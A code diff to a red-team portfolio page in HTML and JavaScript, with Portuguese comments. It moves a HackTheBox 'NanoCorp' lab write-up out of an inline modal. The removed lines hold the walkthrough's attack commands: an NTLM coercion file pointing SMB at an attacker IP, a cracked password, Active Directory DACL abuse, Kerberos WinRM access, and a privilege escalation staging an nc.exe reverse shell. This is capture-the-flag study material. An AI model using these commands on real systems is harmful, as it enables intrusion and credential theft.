@@ -978,16 +978,17 @@
         <div class="about-text reveal">
           <div class="classified-stamp">&#9632; Classified // Level Apprentice</div>
           <p>
-           Offensive security researcher with a deep focus on <strong>Red Team operations</strong> and <strong>adversary simulation.</strong> 
+            Offensive security researcher with a <strong>deep focus on Red Team operations</strong>
+            and adversary simulation.
           </p>
           <p>
-             I approach every target the same way: understand the architecture, 
-             map the attack surface, and find the path of least resistance. Whether 
-             it's vulnerability research, phishing campaigns, or post-exploitation pivoting, 
-             the goal is always full compromise.
+            I approach every target the same way: <strong>understand the architecture,
+            map the attack surface, and find the path of least resistance</strong>.
+            Whether it's vulnerability research, phishing campaigns, or post-exploitation
+            pivoting, the goal is always full compromise.
           </p>
           <p>
-            Currently studying APT simulation methodologies using 
+            Currently studying APT simulation methodologies using
             <span class="hl">MITRE ATT&CK</span>, C2 frameworks (Havoc C2 / Cobalt Strike),
             and adversarial tooling. Oriented toward <span class="hl">Bug Bounty</span> and
             professional Red Team engagements.
@@ -1071,20 +1072,6 @@
     </div>
   </section>
 
-  <!-- ====================================================
-       MODAL
-  ==================================================== -->
-  <div id="modal-overlay">
-    <div id="modal">
-      <div class="modal-header">
-        <div>
-          <div class="modal-title" id="modal-title">Writeup Title</div>
-        </div>
-        <button class="modal-close" id="modal-close">[X]</button>
-      </div>
-      <div class="modal-body" id="modal-body"></div>
-    </div>
-  </div>
 
   <!-- ====================================================
        FOOTER
@@ -1136,28 +1123,12 @@
   </script>
 
   <!-- ====================================================
-       DATA: WRITEUPS
-       Para adicionar um novo writeup, copie o objeto {}
-       e insira no array abaixo. Todos os campos são opcionais
-       exceto title, date e platform.
+       DATA: WRITEUPS — metadados + url para o HTML do writeup.
+       Para adicionar novo writeup: copie o objeto e ajuste os campos.
+       O campo "url" aponta para o arquivo em writeups/
   ==================================================== -->
   <script>
   const WRITEUPS = [
-    /*
-    {
-      id: 1,
-      title: "Machine Name — HTB",
-      platform: "Hack The Box",
-      date: "2025-04-10",
-      difficulty: "medium",           // easy | medium | hard
-      image: "",                      // URL ou deixe vazio
-      description: "Breve descrição do laboratório e o que foi explorado.",
-      methodology: "Enumeration com nmap, descoberta de CVE X, exploração via ...",
-      exploitation: "Payload utilizado: `...'`. A vulnerabilidade estava em ...",
-      conclusion: "Aprendizados e principais takeaways.",
-    },
-    */
-    // ── Adicione seus writeups abaixo ──
     {
       id: 1,
       title: "NanoCorp — HackTheBox",
@@ -1165,92 +1136,10 @@
       date: "2025-11-14",
       difficulty: "hard",
       image: "",
-      description: "Windows Server 2022 / Active Directory. Cadeia de ataque multi-estágio: NTLM hash leak 0-click via CVE-2025-24071, abuso de DACL no AD (AddSelf → ForceChangePassword), acesso WinRM via Kerberos e escalação de privilégio pelo agente Checkmk (CVE-2024-0670).",
-
-      methodology: `
-<strong>// 01 — Port Scan & Reconnaissance</strong><br/><br/>
-<code>sudo nmap -sV -O -sC -sT -v nanocorp.htb</code><br/><br/>
-Portas abertas identificadas no DC (<code>10.10.11.93</code>):<br/>
-<code>53</code> DNS · <code>80</code> HTTP (Apache 2.4.58 / PHP 8.2) · <code>88</code> Kerberos · <code>135/139/445</code> RPC/SMB · <code>389/636/3268/3269</code> LDAP/LDAPS · <code>5986</code> WinRM-SSL<br/><br/>
-O certificado em <code>5986</code> confirma o hostname <code>dc01.nanocorp.htb</code>. Clock-skew de ~6h31m detectado — sincronização necessária antes de usar Kerberos.<br/><br/>
-
-<strong>// 02 — Foothold: CVE-2025-24071 — 0-click NTLM Hash Leak</strong><br/><br/>
-Na porta 80 existe um painel de upload de arquivos ZIP. A vulnerabilidade abusa do comportamento do Windows Explorer ao processar arquivos <code>.library-ms</code>:<br/><br/>
-Quando um <code>.library-ms</code> é extraído (ou até visualizado), o Explorer lê o XML interno e tenta acessar automaticamente a tag <code>&lt;url&gt;</code> via SMB — disparando uma autenticação NTLM sem interação do usuário.<br/><br/>
-O exploit gera o arquivo malicioso e empacota em ZIP:<br/>
-<code>&lt;url&gt;\\\\10.10.14.103\\shared&lt;/url&gt;</code><br/><br/>
-Com o Responder ouvindo na interface <code>tun0</code>, o hash foi capturado assim que o ZIP foi processado pelo servidor:<br/><br/>
-<code>web_svc::NANOCORP:38a74873a2057e77:55741262F91D...→ NetNTLMv2</code><br/><br/>
-Hash quebrado com hashcat (<code>-m 5600</code>) + rockyou.txt em ~1 segundo:<br/>
-<code>WEB_SVC : dksehdgh712!@#</code><br/><br/>
-
-<strong>// 03 — AD Enumeration com BloodHound</strong><br/><br/>
-<code>bloodhound-python -d nanocorp.htb -u WEB_SVC -p 'dksehdgh712!@#' -c All -ns 10.10.11.93</code><br/><br/>
-Resultado relevante:<br/>
-→ 6 usuários encontrados → <code>monitoring_svc</code> é o alvo<br/>
-→ 0 trusts → sem possibilidade de movimento lateral por certificate trust<br/>
-→ Grupo <code>IT_SUPPORT</code> identificado em <code>CN=USERS</code><br/><br/>
-Caminho de ataque mapeado pelo BloodHound:<br/>
-<code>web_svc</code> tem <strong>AddSelf</strong> em <code>IT_SUPPORT</code> →<br/>
-<code>IT_SUPPORT</code> tem <strong>ForceChangePassword</strong> sobre <code>monitoring_svc</code> →<br/>
-<code>monitoring_svc</code> membro de <strong>Remote Management Users</strong> → WinRM no DC
-      `,
-
-      exploitation: `
-<strong>// 04 — DACL Abuse: web_svc → IT_SUPPORT → monitoring_svc</strong><br/><br/>
-Adicionando <code>web_svc</code> ao grupo <code>IT_SUPPORT</code>:<br/>
-<code>bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' add groupMember it_support web_svc</code><br/>
-<code>[+] web_svc added to it_support</code><br/><br/>
-Alterando a senha do <code>monitoring_svc</code>:<br/>
-<code>bloodyAD --host dc01.nanocorp.htb -d nanocorp.htb -u web_svc -p 'dksehdgh712!@#' set password monitoring_svc 'Rele4ase123$!'</code><br/>
-<code>[+] Password changed successfully!</code><br/><br/>
-
-<strong>// 05 — Acesso WinRM via Kerberos (porta 5986 SSL)</strong><br/><br/>
-<code>impacket-getTGT -dc-ip 10.10.11.93 'nanocorp.htb/monitoring_svc:Rele4ase123$!'</code><br/>
-<code>export KRB5CCNAME=monitoring_svc.ccache</code><br/><br/>
-O <code>evil-winrm</code> padrão falha pois o WinRM está em HTTPS/5986. Solução via <code>winrmexec.py</code>:<br/>
-<code>python3 winrmexec.py -ssl -port 5986 -k nanocorp.htb/monitoring_svc@dc01.nanocorp.htb -no-pass</code><br/><br/>
-Shell obtido como <code>monitoring_svc</code>. <strong>User flag capturada.</strong><br/>
-<code>type user.txt → 01b2848957245ab8b1350efd30efda3b</code><br/><br/>
-
-<strong>// 06 — Privilege Escalation: CVE-2024-0670 (Checkmk MSI Repair)</strong><br/><br/>
-Em <code>C:\\Windows\\Temp</code> existe o binário <code>RunasCs.exe</code> que permite executar processos como outro usuário. O agente Checkmk roda como SYSTEM e é vulnerável a uma race condition no caminho de repair do MSI.<br/><br/>
-O exploit (<code>fuck.ps1</code>) faz:<br/>
-1. Localiza o MSI do Checkmk via registro: <code>HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Installer\\...DisplayName -like '*mk*'</code><br/>
-2. Semeia arquivos <code>.cmd</code> read-only em <code>C:\\Windows\\Temp\\</code> com o payload de reverse shell para <code>nc.exe</code><br/>
-3. Dispara o repair: <code>msiexec.exe /fa [msi_path] /qn</code><br/><br/>
-Execução via RunasCs como <code>web_svc</code>:<br/>
-<code>RunasCs.exe web_svc "dksehdgh712!@#" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\Temp\\fuck.ps1"</code><br/><br/>
-Apesar do erro de output, a conexão reversa chega no listener como <strong>SYSTEM / Administrator</strong>.<br/>
-<code>type root.txt → 791ce35038852fa2c789c840325db122</code>
-      `,
-
-      conclusion: `
-<strong>// Possible threat actor — 0day origin</strong><br/><br/>
-<div style="border:1px dashed #7f1c14;padding:1rem;margin-bottom:1.5rem;background:rgba(127,28,20,.08);text-align:center;">
-  <img id="actor-img" src="" alt="Possible actor who shared the 0day exploit"
-    style="max-width:100%;max-height:260px;object-fit:contain;margin:0 auto;display:block;filter:grayscale(30%);"
-    onerror="this.style.display='none';document.getElementById('actor-img-placeholder').style.display='flex'"/>
-  <div id="actor-img-placeholder" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:120px;gap:.8rem;">
-    <span style="font-size:1.8rem;color:#7f1c14;">&#9632;</span>
-    <span style="font-size:.68rem;letter-spacing:.2em;color:#7f1c14;text-transform:uppercase;">
-      // Substitua o src do &lt;img id="actor-img"&gt; pela URL ou caminho da sua imagem
-    </span>
-  </div>
-  <p style="font-size:.65rem;color:#7f1c14;letter-spacing:.15em;text-transform:uppercase;margin-top:.8rem;">
-    &#9632; Possible actor who shared the CVE-2025-24071 0day
-  </p>
-</div>
-
-<strong>// Key Takeaways</strong><br/><br/>
-• <strong>CVE-2025-24071</strong> é um vetor de coerção NTLM 0-click. Qualquer plataforma que processa ZIPs contendo <code>.library-ms</code> é potencialmente vulnerável — sem interação do usuário.<br/><br/>
-• <strong>DACL misconfigurations</strong> são invisíveis para a maioria dos defensores, mas trivialmente exploráveis com BloodHound. <code>AddSelf</code> + <code>ForceChangePassword</code> é uma cadeia clássica e ainda comum em ambientes reais.<br/><br/>
-• <strong>WinRM sobre HTTPS na porta 5986</strong> quebra o tooling padrão (evil-winrm assume 5985/HTTP). Sempre verificar serviços SSL durante a enumeração.<br/><br/>
-• <strong>CVE-2024-0670</strong> demonstra o perigo de agentes de monitoramento rodando como SYSTEM. Race conditions em caminhos de repair de MSI são um vetor de LPE clássico e frequentemente ignorado.<br/><br/>
-• NanoCorp demonstra como uma cadeia de misconfigs individualmente "baixo risco" pode levar a comprometimento total do domínio — espelhando caminhos de ataque de APTs reais.<br/><br/>
-<code style="color:#e53935;">// Auth: @Rel3ase — github.com/releaseown</code>
-      `,
+      description: "Windows Server 2022 / Active Directory. Cadeia multi-estágio: NTLM hash leak 0-click (CVE-2025-24071), abuso de DACL, WinRM via Kerberos e LPE pelo agente Checkmk (CVE-2024-0670).",
+      url: "writeups/src/nanocorp.html",
     },
+    // ── Adicione novos writeups abaixo ──
   ];
   </script>
 
@@ -1289,13 +1178,14 @@ Apesar do erro de output, a conexão reversa chega no listener como <strong>SYST
   /* ─── BOOT SCREEN ─── */
   const bootLines = [
     "BIOS v4.2.1 — Initializing secure subsystems...",
-    "[ + ] Cryptographic module loaded",
-    "[ + ] Network interface: STEALTH mode",
-    "[ + ] OPSEC layer activated",
-    "[ ... ] Loading operator profile...",
-    "[ + ] Profile found: REL3ASE",
-    "[ ... ] Establishing secure tunnel...",
-    "[ UP ] C2 channel active",
+    "[ OK ] Cryptographic module loaded",
+    "[ OK ] Network interface: STEALTH mode",
+    "[ OK ] OPSEC layer activated",
+    "[ .. ] Loading operator profile...",
+    "[ OK ] Profile found: REL3ASE",
+    "[ OK ] Clearance level: III — UNRESTRICTED",
+    "[ .. ] Establishing secure tunnel...",
+    "[ OK ] C2 channel active",
     "",
     "  ██████╗ ███████╗██╗     ██████╗  █████╗ ███████╗███████╗",
     "  ██╔══██╗██╔════╝██║     ╚════██╗██╔══██╗██╔════╝██╔════╝",
@@ -1305,7 +1195,7 @@ Apesar do erro de output, a conexão reversa chega no listener como <strong>SYST
     "  ╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝",
     "",
     "  OFFENSIVE SECURITY RESEARCHER — SYSTEM READY",
-    "  [ + ] Welcome! ",
+    "  ACCESS GRANTED.",
   ];
 
   const bootTextEl = document.getElementById('boot-text');
@@ -1504,60 +1394,17 @@ Apesar do erro de output, a conexão reversa chega no listener como <strong>SYST
           </div>
           <div class="writeup-title">${w.title}</div>
           <p class="writeup-desc">${w.description || ''}</p>
-          <button class="btn-read" data-id="${w.id}">&gt; Read Writeup</button>
+          <a class="btn-read" href="${w.url}">&gt; Read Writeup</a>
         </div>`;
-      card.querySelector('.btn-read').addEventListener('click', () => openModal(w));
-      card.addEventListener('click', (e) => {
-        if (!e.target.classList.contains('btn-read')) openModal(w);
-      });
+      card.addEventListener('click', () => { window.location.href = w.url; });
+      card.querySelector('.btn-read').addEventListener('click', e => e.stopPropagation());
       wgrid.appendChild(card);
       observer.observe(card);
     });
   }
 
-  /* ─── MODAL ─── */
-  const overlay    = document.getElementById('modal-overlay');
-  const modalTitle = document.getElementById('modal-title');
-  const modalBody  = document.getElementById('modal-body');
-  const modalClose = document.getElementById('modal-close');
-
-  function openModal(w) {
-    modalTitle.textContent = w.title;
-    modalBody.innerHTML = `
-      <div class="modal-meta-row">
-        ${w.platform  ? `<span class="modal-badge">${w.platform}</span>` : ''}
-        ${w.difficulty? `<span class="modal-badge difficulty ${w.difficulty}">${w.difficulty.toUpperCase()}</span>` : ''}
-        ${w.date      ? `<span class="modal-badge">${formatDate(w.date)}</span>` : ''}
-      </div>
-      ${w.methodology ? `
-      <div class="modal-section">
-        <div class="modal-section-title">// Methodology</div>
-        <div class="modal-content">${w.methodology}</div>
-      </div>` : ''}
-      ${w.exploitation ? `
-      <div class="modal-section">
-        <div class="modal-section-title">// Exploitation</div>
-        <div class="modal-content">${w.exploitation}</div>
-      </div>` : ''}
-      ${w.conclusion ? `
-      <div class="modal-section">
-        <div class="modal-section-title">// Conclusions &amp; Takeaways</div>
-        <div class="modal-content">${w.conclusion}</div>
-      </div>` : ''}
-    `;
-    overlay.classList.add('open');
-    document.body.style.overflow = 'hidden';
-  }
-
-  function closeModal() {
-    overlay.classList.remove('open');
-    document.body.style.overflow = '';
-  }
-
-  modalClose.addEventListener('click', closeModal);
-  overlay.addEventListener('click', e => { if (e.target === overlay) closeModal(); });
-  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
-
+  /* ─── FOOTER YEAR ─── */
+  document.getElementById('footer-year').textContent = new Date().getFullYear();
   /* ─── FOOTER YEAR ─── */
   document.getElementById('footer-year').textContent = new Date().getFullYear();
   </script>
